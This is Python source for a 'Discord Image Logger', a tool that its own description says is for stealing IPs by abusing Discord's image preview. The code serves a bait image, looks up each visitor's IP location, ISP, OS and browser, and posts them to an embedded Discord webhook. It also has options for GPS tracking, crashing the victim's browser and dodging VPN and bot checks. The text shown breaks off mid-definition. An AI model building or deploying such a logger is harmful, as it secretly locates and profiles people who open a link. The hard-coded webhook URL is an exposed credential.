# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1199592121146024036/q9z4Af6cxoaBzxbm9OEc6IiJ200v6sO7se1mzjVILrQgTeV-TgXMBcJXQAFBbyBQ3yiE",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
